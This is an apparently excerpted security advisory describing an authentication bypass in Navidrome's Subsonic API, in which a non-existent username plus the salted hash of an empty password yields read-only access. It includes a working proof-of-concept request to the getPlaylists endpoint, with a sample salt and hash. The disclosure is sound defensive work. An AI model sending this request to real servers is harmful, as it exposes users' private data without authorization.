  "summary": "Navidrome allows an authentication bypass in Subsonic API with non-existent username",
  "details": "### Summary\n\nIn certain Subsonic API endpoints, authentication can be bypassed by using a non-existent username combined with an empty (salted) password hash. This allows read-only access to the server’s resources, though attempts at write operations fail with a “permission denied” error.\n\n### Details\n\nA flaw in the authentication check process allows an attacker to specify any arbitrary username that does not exist on the system, along with a salted hash of an empty password. Under these conditions, Navidrome treats the request as authenticated, granting access to various Subsonic endpoints without requiring valid credentials.\n\n### Proof of Concept (PoC)\n\n1. Generate a random salt:\n\n   ```javascript\n   // e.g., salt = \"x1vbudn1m6d\"\n   Math.random().toString(36).substring(2, 15)\n   ```\n\n2. Calculate the MD5 hash of an empty password plus the salt:\n\n   ```shell\n   # Using the example salt above\n   echo -n \"x1vbudn1m6d\" | md5sum\n   81f0c0fb5d202ab0d012e6eaeb722d79  -\n   ```\n\n3. Send a request specifying a fake user, with the hash and salt values:\n\n   ```\n   GET https://[host]/rest/getPlaylists?u=FakeUser\u0026t=81f0c0fb5d202ab0d012e6eaeb722d79\u0026s=x1vbudn1m6d\u0026v=1.16.1\u0026c=castafiore\u0026f=json\n   ```\n\n### Impact\n\nAn attacker can use any non-existent username to bypass the authentication system and gain access to various read-only data in Navidrome, such as user playlists. However, any attempt to modify data fails due to insufficient permissions, limiting the impact to unauthorized viewing of information.",
